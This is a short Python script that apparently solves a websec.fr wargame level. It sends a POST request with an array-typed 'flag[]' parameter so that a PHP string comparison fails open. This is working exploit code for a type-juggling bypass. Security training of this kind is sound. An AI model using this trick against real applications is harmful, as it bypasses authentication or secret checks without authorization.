from requests import *

url = 'http://websec.fr/level17/index.php'
data = {
    'flag[]' : '',
    'submit' : 'Go'
}

r = post(url , data=data)
print r.text
